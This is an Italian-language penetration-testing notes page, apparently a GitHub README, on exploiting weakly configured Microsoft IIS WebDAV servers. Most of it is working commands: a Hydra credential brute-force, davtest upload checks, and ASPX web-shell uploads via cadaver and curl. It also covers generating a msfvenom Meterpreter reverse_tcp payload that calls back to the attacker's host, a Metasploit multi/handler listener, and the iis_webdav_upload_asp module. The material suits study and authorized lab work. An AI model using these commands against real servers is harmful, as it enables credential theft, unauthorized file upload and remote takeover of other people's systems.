<a href="https://github.com/Gigidotexe/Penetration_Test_notes/blob/main/README.md"> Back </a>
# Microsoft IIS WebDAV – Introduzione e Exploit
**WebDAV (Web Distributed Authoring and Versioning)** è un protocollo composto da un set di estensioni HTTP che consentono agli utenti di modificare e gestire in modo collaborativo i file su **Microsoft IIS**. <br>
Microsoft IIS è un server web proprietario sviluppato da Microsoft, in grado di ospitare applicazioni web e siti web, in modo simile ad altri server come Apache o Nginx <br>
WebDAV espone in genere la stessa porta del sito (80/443) e supporta metodi aggiuntivi come `PROPFIND`, `MKCOL`, `PUT`. <br>

Una configurazione debole (per‑mancanza di ACL o controllo sul metodo **PUT**) consente a un attaccante di **caricare ed eseguire file arbitrari**, ottenendo RCE.

---

## Brute‑force credenziali (opzionale)

Una volta confermata la presenza del servizio e un mancato controllo del metodo PUT durante laprecedente fase di Scansione ed Enumerazione, possiamo tentare di scoprire le credenziali di accesso usando Hydra: <br>
```bash
hydra -L /usr/share/wordlists/common_users.txt -P /usr/share/wordlists/common_passwords.txt -s 80 -f -u <IP> http-get /webdav
```

* `-L` / `-P` puntano ai file utenti / password. <br>
* `-s 80` specifica la porta. <br>
* `-f` interrompe alla prima coppia valida. <br>
* `-u` mantiene la stessa connessione. <br>

Se il server usa HTTPS, sostituisci `http-get` con `https-get` e porta 443: <br>
Se invece vuoi effettuare un login standard basta mettere `/` al posto di `/webdav` per autenticarti
> ovviamente puoi mettere qualsiasi altra directory che richiede autenticazione dopo `/`

---

## Verifica upload con credenziali

dopo aver scoperto le credenziali di accesso, analizziamoi il comportamento usando davtest:
```bash
davtest -auth <user>:<pass> -url http://<IP>/webdav`
```

Se `PUT` va a buon fine, verrà indicato “SUCCESS” per l’estensione caricata.

---

## 4 – Upload di una Web‑Shell con **cadaver**
Se il metodo PUT funziona, possiamo caricare una webshell usando `cadaver`
```bash
cadaver http://<IP>/webdav` # client WebDAV interattivo.
put C:\\webshell\\cmd.aspx` # carica la web‑shell ASPX.
```

Tutte le web shells disponibili su kali sono visualizzabili al path 
```bash
/usr/share/webshells
```

Dopo aver caricato una webshell, ricaricando la pagina del browser dov’era aperta la pagina di WebDAV, possiamo visualizzare la shell caricata quindi, cliccando su di essa per eseguirla, potremmo avere una schermata con la possibilità di inserire dei comandi

---

## 5 – Upload via curl e put
possiamo anche caricare la shell usando curl:
```bash
curl -T shell.aspx http://<user>:<pass>@<IP>/webdav/shell.aspx` # carica shell ASPX
```

e tramite il metodo put:
```bash
put </usr/share/webshells/webshell.aspx>
```

---

## 6 – Generazione Payload con **msfvenom**
é possibile generare una shell usando msfvenom: 

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<KaliIP> LPORT=<Port> -f aspx > shell.aspx
```

Carica `shell.aspx` via `cadaver` o `curl`; una volta richiamato, avrai la sessione Meterpreter.

---

## 7 – Listener Metasploit
Per poter ricevere una connessione reverse shell, si usa il `multi/handler` di Metasploit
```bash
use multi/handler # modulo listener generico
set payload windows/meterpreter/reverse_tcp # definisce il payload
set LHOST <KaliIP> # IP della macchina Kali
set LPORT <Port> # porta configurata nel payload
run # avvia il listener in attesa della connessione
```

e successivamente eseguiamo la shell caricata sul target con `cadaver` o `curl`

Queso processo é totalmente automatizzabile usando il modulo
```bash
exploit/windows/iis/iis_webdav_upload_asp
```

---
